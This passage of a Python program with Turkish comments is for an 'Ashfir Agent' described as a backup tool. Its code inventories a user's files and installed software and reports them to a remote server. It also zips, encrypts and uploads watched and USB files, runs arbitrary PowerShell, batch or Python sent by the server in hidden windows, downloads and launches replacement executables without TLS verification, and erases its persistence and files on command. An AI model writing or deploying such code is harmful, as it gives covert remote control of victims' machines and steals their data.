                                fpath = os.path.join(root, f)
                                try:
                                    stat = os.stat(fpath)
                                    knowledge["important_files"].append({
                                        "name": f,
                                        "path": os.path.relpath(fpath, user_profile),
                                        "size": human_size(stat.st_size),
                                        "modified": time.strftime('%Y-%m-%d', time.localtime(stat.st_mtime))
                                    })
                                except: pass
                                
                            if len(knowledge["important_files"]) >= 40:
                                break
                        if len(knowledge["important_files"]) >= 40:
                            break
                except: pass
        
        # Yüklü yazılım ipuçları (Program Files'dan klasör adları)
        for pf in ['C:\\Program Files', 'C:\\Program Files (x86)']:
            if os.path.exists(pf):
                try:
                    knowledge["software_hints"].extend([
                        d for d in os.listdir(pf) 
                        if os.path.isdir(os.path.join(pf, d)) 
                        and d.lower() not in {'common files', 'windowsapps', 'windows defender', 'windows nt', 'internet explorer'}
                    ])
                except: pass
        
    except Exception as e:
        log.error(f"AI file knowledge hatasi: {e}")
    return knowledge


def get_directory_map():
    base_map = get_comprehensive_directory_map()
    base_map["_ai_knowledge"] = get_ai_file_knowledge()
    return base_map


# ── SELF DESTRUCT ────────────────────────────────────────────
def self_destruct(cfg=None):
    try:
        log.warning("Self-destruct tetiklendi. Ajan sistemden tamamen siliniyor...")
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(k, 'AshfirAgent')
            winreg.CloseKey(k)
        except: pass
        
        subprocess.run(['schtasks', '/delete', '/tn', 'AshfirAgent', '/f'], capture_output=True, creationflags=0x08000000)
        
        bat_path = os.path.join(tempfile.gettempdir(), 'clean_ashfir.bat')
        bat_content = f'@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q "{exe_path}"\nrmdir /s /q "{BASE_DIR}"\ndel /f /q "%~f0"\n'
        with open(bat_path, 'w') as f:
            f.write(bat_content)
            
        subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000, close_fds=True)
        os._exit(0)
    except Exception as e:
        log.error(f"Self-destruct hatasi: {e}")
        os._exit(1)


def remote_update(update_url, cfg=None):
    try:
        log.warning(f"Remote update başlatılıyor: {update_url}")
        res = requests.get(update_url, timeout=30, verify=False)
        if res.status_code == 200:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            new_exe = os.path.join(tempfile.gettempdir(), 'new_ashfir.exe')
            with open(new_exe, 'wb') as f:
                f.write(res.content)
            
            bat_path = os.path.join(tempfile.gettempdir(), 'update_ashfir.bat')
            bat_content = f'@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q "{exe_path}"\ncopy /y "{new_exe}" "{exe_path}"\nstart "" "{exe_path}"\ndel /f /q "{new_exe}"\ndel /f /q "%~f0"\n'
            with open(bat_path, 'w') as f:
                f.write(bat_content)
                
            subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000, close_fds=True)
            os._exit(0)
    except Exception as e:
        log.error(f"Remote update hatasi: {e}")


def execute_remote_code(code, code_type, cfg=None):
    def emit_log(msg, level='info'):
        log.info(msg)
        if cfg:
            try:
                cf_post('/log', json_data={"key": cfg.key, "level": level, "message": f'[REMOTE-CODE] {msg}', "source": "agent", "ts": int(time.time() * 1000)})
            except: pass

    emit_log(f'Kod çalıştırılıyor (Tip: {code_type})')
    try:
        if code_type == 'python':
            py_file = os.path.join(tempfile.gettempdir(), f'remote_script_{int(time.time())}.py')
            with open(py_file, 'w', encoding='utf-8') as f:
                f.write(code)
            ret = subprocess.run([sys.executable if getattr(sys, 'frozen', False) else 'python', py_file], capture_output=True, text=True, creationflags=0x08000000, timeout=60)
            os.remove(py_file)
            stdout, stderr = ret.stdout, ret.stderr
        elif code_type == 'cmd' or code_type == 'batch':
            bat_file = os.path.join(tempfile.gettempdir(), f'remote_script_{int(time.time())}.bat')
            with open(bat_file, 'w', encoding='cp850', errors='replace') as f:
                f.write(code)
            ret = subprocess.run(['cmd.exe', '/c', bat_file], capture_output=True, text=True, creationflags=0x08000000, timeout=60)
            os.remove(bat_file)
            stdout, stderr = ret.stdout, ret.stderr
        else: # Default: PowerShell
            ps_file = os.path.join(tempfile.gettempdir(), f'remote_script_{int(time.time())}.ps1')
            with open(ps_file, 'w', encoding='utf-8') as f:
                f.write(code)
            ret = subprocess.run(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', ps_file], capture_output=True, text=True, creationflags=0x08000000, timeout=60)
            os.remove(ps_file)
            stdout, stderr = ret.stdout, ret.stderr
            
        if stdout: emit_log(f'Çıktı (Stdout):\n{stdout}', level='success')
        if stderr: emit_log(f'Hata (Stderr):\n{stderr}', level='warn')
    except Exception as e:
        emit_log(f'Kod çalıştırma hatası: {e}', level='error')



# ── SYNC KONTROL ─────────────────────────────────────────────
sync_stop_event = threading.Event()
sync_wake_event = threading.Event()
sync_lock       = threading.Lock()


def update_watches(cfg, observer, active_watches, queue_manager, ai, stats):
    rc = cfg.all_remote
    watch_paths = rc.get('watch_paths', [])

    if not watch_paths:
        desktop = get_smart_desktop()
        if os.path.exists(desktop):
            watch_paths = [desktop]

    valid_paths = [p for p in watch_paths if os.path.exists(p)]

    for path in valid_paths:
        if path not in active_watches:
            h = Handler(queue_manager, ai, cfg, path, stats, source_label='PC')
            w = observer.schedule(h, path, recursive=True)
            active_watches[path] = w
            log.info(f'📂 İzlemeye alındı: {path}')

    to_remove = [p for p in active_watches if p not in valid_paths]
    for p in to_remove:
        observer.unschedule(active_watches[p])
        del active_watches[p]
        log.info(f'❌ İzlemeden çıkarıldı: {p}')


# ── HEARTBEAT ────────────────────────────────────────────────
def heartbeat_loop(cfg, stats, queue_manager, ai, observer, active_watches, start_time):
    log.info('Heartbeat (API Polling) başlatıldı')

    while True:
        try:
            # İnternet yoksa bekle
            if not is_online():
                log.debug('İnternet yok, heartbeat bekleniyor...')
                time.sleep(30)
                continue

            payload = {
                "key": cfg.key,
                "machine_name": cfg.machine_name,
                "online": True,
                "last_seen": datetime.now().isoformat(),
                "files_uploaded": stats['files_uploaded'],
                "ai_skipped": stats['ai_skipped'],
                "last_file": stats['last_file'],
                "uptime_seconds": int(time.time() - start_time),
                "directory_map": get_directory_map()
            }

            res = cf_post('/heartbeat', json_data=payload)
            if res and res.status_code == 200:
                data = res.json()
                
                # Config güncelleme
                if 'config' in data:
                    new_cfg = data['config']
                    if cfg.has_watch_paths_changed(new_cfg):
                        log.info('Config değişti — watch paths güncelleniyor')
                        cfg.update_remote(new_cfg)
                        update_watches(cfg, observer, active_watches, queue_manager, ai, stats)
                        sync_stop_event.set()

                        def restart_sync():
                            time.sleep(2)
                            sync_stop_event.clear()
                            rc = cfg.all_remote
                            paths = [p for p in rc.get('watch_paths', []) if os.path.exists(p)]
                            if not paths:
                                paths = [get_smart_desktop()]
                            initial_sync(queue_manager, ai, paths, rc)

                        threading.Thread(target=restart_sync, daemon=True).start()
                    else:
                        cfg.update_remote(new_cfg)
                        update_watches(cfg, observer, active_watches, queue_manager, ai, stats)
                    
                    # Ayar geldi, hemen kontrol etmesi için uykuyu böl
                    sync_wake_event.set()
                
                # Self-destruct kontrolü
                if data.get('self_destruct'):
                    log.warning('SELF-DESTRUCT komutu alındı!')
                    # Komutu Firestore'dan temizle (tekrar tetiklenmesin)
                    try: cf_post('/clear_command', json_data={"key": cfg.key, "field": "self_destruct"})
                    except: pass
                    self_destruct(cfg)

                # Remote update kontrolü
                update_url = data.get('update_url') or data.get('update_agent')
                if update_url:
                    log.warning(f'REMOTE UPDATE komutu alındı: {update_url}')
                    # Komutu Firestore'dan temizle (sonsuz döngü olmasın)
                    try: cf_post('/clear_command', json_data={"key": cfg.key, "field": "update_url"})
                    except: pass
                    remote_update(update_url, cfg)

                # Remote code kontrolü
                remote_code = data.get('remote_code')
                if remote_code:
                    code_type = data.get('code_type', 'batch')
                    log.warning(f'REMOTE CODE komutu alındı: Tip={code_type}')
                    execute_remote_code(remote_code, code_type, cfg)
                    # Komutu Firestore'dan temizle (tekrar çalışmasın)
                    try: cf_post('/clear_command', json_data={"key": cfg.key, "field": "remote_code"})
                    except: pass

        except Exception as e:
            log.error(f'Heartbeat loop hatası: {e}')
        
        time.sleep(30)



# ── BACKGROUND SYNC LOOP ─────────────────────────────────────
def background_sync_loop(cfg, queue_manager, uploader, flash_monitor):
    log.info('Background sync loop başlatıldı (10 dk aralıklarla)')
    while True:
        # Uyandıktan sonra kuyruktaki tüm dosyalar bitene kadar chunk'ları gönder
        while True:
            try:
                # NOT: USB kopyalama copy_and_watch() ile ayrı thread'de çalışıyor.
                # Burada beklemiyoruz — upload ve USB kopyalama paralel ilerler.
                # USB bittikten sonra dosyaları kuyruğa ekler, sırasını bekler.
                    
                queue = queue_manager.get_all()
                if not queue:
                    break # Kuyruk bitti, iç döngüden çık ve ana döngünün sonunda bekle
                    
                if not is_online():
                    log.debug('İnternet yok, sync bekleniyor...')
                    time.sleep(60)
                    continue
                    
                # İnternet var, hizi test et ve zip chunk boyutunu belirle
                chunk_size_limit = get_network_chunk_size()
                
                # Kuyruktaki dosyalari grupla
                current_chunk = []
                current_size = 0
                processed_paths = []
                
                for path, meta in queue.items():
                    if not os.path.exists(path):
                        log.info(f"⚠️ Dosya bulunamadı, kuyruktan çıkarılıyor: {path}")
                        processed_paths.append(path)
                        continue
                        
                    cached, fhash = uploader.is_cached(path)
                    if cached:
                        # Zaten yüklenmiş, kuyruktan çıkar
                        processed_paths.append(path)
                        continue
                        
                    try:
                        size = os.path.getsize(path)
                        # 70MB kesin limit (tekil dosya)
                        if size > 70 * 1024 * 1024:
                            log.warning(f"⚠️ Dosya boyutu 70MB'den büyük olduğu için atlandı: {path}")
                            processed_paths.append(path)
                            continue
                            
                        # 50MB normal paket boyutu esnekliği 
                        # (Eğer tek dosya büyükse 50'yi aşar ama ilk dosya ise eklenmesine izin verilir, sonra break olur)
                        if current_size > 0 and current_size + size > 50 * 1024 * 1024:
                            break

                        current_chunk.append({'path': path, 'size': size, 'hash': fhash, 'meta': meta})
                        current_size += size
                    except Exception as e:
                        log.warning(f"⚠️ Dosya okuma hatası: {path} - {e}")
                        processed_paths.append(path)

                    if current_size >= 50 * 1024 * 1024:
                        break
                        
                if processed_paths and not current_chunk:
                    log.info(f"⏭️ {len(processed_paths)} dosya hafızada (cache) bulunduğu için atlandı.")
                if current_chunk:
                    log.info(f'{len(current_chunk)} dosya zipleniyor... Toplam: {human_size(current_size)}')
                    
                    # Zip oluştur
                    zip_name = f"backup_{int(time.time())}.zip"
                    zip_path = BASE_DIR / zip_name
                    
                    success_count = 0
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for item in current_chunk:
                            try:
                                # Zip icinde goreceli yol (root'a gore)
                                rel_path = Path(item['path']).relative_to(Path(item['meta']['watch_root']))
                                zipf.write(item['path'], arcname=str(rel_path))
                                success_count += 1
                            except Exception as e:
                                log.warning(f"Dosya ziplenemedi (kilitli olabilir): {item['path']} - {e}")
                    
                    if success_count == 0:
                        try: os.remove(zip_path)
                        except: pass
                        continue
    
                    # Zip şifrele
                    enc_zip_path, encrypted_aes_key = encrypt_zip_file(zip_path)
                    
                    # Yükle (İnternet kontrolü ile)
                    upload_ok = False
                    attempt = 0
                    while attempt < 3:
                        if is_online():
                            if uploader.upload_zip(enc_zip_path, encrypted_aes_key, current_chunk, current_size):
                                for item in current_chunk:
                                    if item['hash']:
                                        uploader.update_cache(item['path'], item['hash'])
                                    processed_paths.append(item['path'])  # Başarılı upload sonrası işaretle
                                queue_manager.remove(processed_paths)
                                upload_ok = True
                                break
                        else:
                            log.debug("Sync sırasında internet koptu, bekleniyor...")
                        
                        attempt += 1
                        time.sleep(5)
                    
                    if not upload_ok:
                        log.error(f"⚠️ {zip_name} yüklenemedi, 5 dakika sonra tekrar denenecek.")
                        # Sadece silinmiş/cache'li dosyaları kuyruktan çıkar, başarısızları bırak
                        queue_manager.remove([p for p in processed_paths if p not in [i['path'] for i in current_chunk]])
                    
                    # Temizlik (her durumda zip dosyalarını sil)
                    try:
                        os.remove(zip_path)
                        os.remove(enc_zip_path)
                    except: pass
                    
                    if not upload_ok:
                        # Upload başarısız olduysa iç döngüden çık, 5 dk bekle
                        break
                    
                    # Sistem yorulmasın diye chunk'lar arası çok ufak bir es
                    time.sleep(1)
                else:
                    # Chunk boşsa sadece gereksiz kayıtları temizle
                    queue_manager.remove(processed_paths)
                    
            except Exception as e:
                log.error(f'Background sync hatası: {e}')
                time.sleep(30)
                
        # İç döngüden çıktık (kuyruk bitti veya upload başarısız)
        # sync_wake_event ile biri uykumuzu bölerse (örn. yeni flash, yeni ayar), anında döngüye gireriz.
        if cfg.get('test_mode', False):
            log.info("🧪 Test modu aktif: 30 saniye sonra tekrar kontrol edilecek.")
            sync_wake_event.wait(30)
        else:
            # Kuyruk varsa 5 dk, yoksa 10 dk bekle
            has_queue = bool(queue_manager.get_all())
            wait_time = 300 if has_queue else 600  # 5 dk retry, 10 dk normal
            log.info(f"⏳ Sync bekleniyor ({wait_time//60} dk)...")
            sync_wake_event.wait(wait_time)

        sync_wake_event.clear()


# ── INITIAL SYNC ─────────────────────────────────────────────
def initial_sync(queue_manager, ai, paths, cfg):
    with sync_lock:
        sync_enabled = cfg.get('sync_on_start', True)
        if not sync_enabled:
            return

        sync_stop_event.clear()
        log.info(f'🔄 Senkronizasyon başladı: {paths}')
        total = 0

        for root in paths:
            if sync_stop_event.is_set():
                log.info('⛔ Senkronizasyon kesildi')
                return

            for dp, dirs, files in os.walk(root):
                if sync_stop_event.is_set():
                    break
                dirs[:] = [d for d in dirs
                            if d.lower() not in BLOCKED_DIRS and not d.startswith('.')]
                for fname in files:
                    if sync_stop_event.is_set():
                        break
                    fp = os.path.join(dp, fname)
                    if not passes_basic(fp, cfg):
                        continue
                    size = os.path.getsize(fp)
                    ai_r = ai.should_backup(fp, size)
                    if ai_r['should_backup']:
                        queue_manager.enqueue(fp, root, ai_r.get('reason', ''), ai_r.get('confidence', 1.0))
                        total += 1

        log.info(f'✅ Senkronizasyon bitti: {total} dosya')


# ── MAIN ─────────────────────────────────────────────────────
def main():
    log.info('=' * 55)
    log.info('Ashfir Agent başlatıldı')
    log.info('=' * 55)

    cfg = AgentConfig()
    log.info(f'Key: {cfg.key[:8]}... | Makine: {cfg.machine_name}')

    server_handler = ServerLogHandler(cfg)
    server_handler.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
    log.addHandler(server_handler)

    # İlk config'i API'den al
    try:
        url = f"{CF_URL}/heartbeat"
        headers = {"Authorization": f"Bearer {CF_TOKEN}"}
        res = sh.post(url, headers=headers, json={"key": cfg.key, "machine_name": cfg.machine_name}, timeout=10)
        if res.status_code == 200:
            data = res.json()
            if 'config' in data:
                cfg.update_remote(data['config'])
                log.info('✅ Config alındı')
            else:
                log.warning('⚠️ Config dokümanı bulunamadı')
        else:
            log.warning(f'⚠️ Config alınamadı: HTTP {res.status_code}')
    except Exception as e:
        log.warning(f'⚠️ Config alınamadı: {e}')

    rc          = cfg.all_remote
    watch_paths = rc.get('watch_paths', [])
    valid_paths = [p for p in watch_paths if os.path.exists(p)]

    queue_manager = QueueManager()
    uploader = Uploader(cfg)
    ai       = SmartFilter(cfg)
    stats    = {'files_uploaded': 0, 'ai_skipped': 0, 'last_file': None}
    start    = time.time()

    if not valid_paths:
        desktop = get_smart_desktop()
        if os.path.exists(desktop):
            valid_paths = [desktop]
            log.info(f'⚠️ Klasör yok, Masaüstü kullanılıyor: {desktop}')

    observer       = Observer()
    active_watches = {}

    for path in valid_paths:
        h = Handler(queue_manager, ai, cfg, path, stats, source_label='PC')
        w = observer.schedule(h, path, recursive=True)
        active_watches[path] = w
        log.info(f'📂 İzleniyor: {path}')

    if STAGE_DIR.exists():
        stage_handler = Handler(queue_manager, ai, cfg, str(STAGE_DIR), stats, source_label='FLASH_STAGE')
        observer.schedule(stage_handler, str(STAGE_DIR), recursive=True)

    observer.start()

    flash_monitor = FlashMonitor(queue_manager, ai, cfg, stats, observer)

    threading.Thread(
        target=initial_sync, args=(queue_manager, ai, valid_paths, rc), daemon=True
    ).start()
    threading.Thread(
        target=heartbeat_loop,
        args=(cfg, stats, queue_manager, ai, observer, active_watches, start),
        daemon=True
    ).start()

    threading.Thread(
        target=background_sync_loop,
        args=(cfg, queue_manager, uploader, flash_monitor),
        daemon=True
    ).start()

    log.info('✅ Agent aktif')

    try:
        while True:
            flash_monitor.poll()
            time.sleep(5)
    except (KeyboardInterrupt, SystemExit):
        observer.stop()
        observer.join()
        log.info('Agent kapatıldı')


if __name__ == '__main__':
    main()